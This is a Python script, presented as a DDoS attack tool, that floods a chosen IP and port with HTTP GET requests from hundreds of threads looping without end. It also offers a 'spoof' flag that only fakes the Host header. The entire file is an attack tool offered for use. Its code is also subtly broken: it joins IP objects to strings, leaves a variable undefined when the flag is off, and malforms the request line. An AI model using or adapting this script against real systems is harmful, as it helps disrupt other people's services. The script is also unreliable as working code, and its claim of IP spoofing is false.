import socket
import threading
import argparse
import ipaddress
import random


# Function to define the IP address type
def ip_address(ip):
    try:
        return ipaddress.ip_address(ip)
    except ValueError:
        raise argparse.ArgumentTypeError(f"Invalid IP address {ip}")


# Parsing the flags
parser = argparse.ArgumentParser(description='DDoS attack script using simulated multithreading.')
parser.add_argument('-d', '--destination', type=ip_address, required=True, help="Target IP address.")
parser.add_argument('-p', '--port', type=int, default=80, help="The port the script will attack (only 80 is supported for now)")
parser.add_argument('-s', '--spoof', action='store_true', help='Use a spoofed random IP address.')
parser.add_argument('-t', '--threads', type=int, default=500,  help='Specify the numbers of threads to be running.')

args = parser.parse_args()

# Generating a random ip address for spoofing
if args.spoof:
    fip = f"{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"
    fip = ip_address(fip)
else:
    print('[-] Warning: Using your IP address in the request headers. Use -s to spoof your IP.')


# The attack method
def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((args.destination, args.port))
        s.sendto(("GET" + args.destination + " HTTP/1.1\r\n").encode('ascii'), (args.destination, args.port))
        s.sendto(("Host: " + fip + "\r\n\r\n").encode('ascii'), (args.destination, args.port))
        s.close()
        print("[+] Connected\t")


# Running multiple threads
for i in range(args.threads):
    thread = threading.Thread(target=attack)
    thread.start()
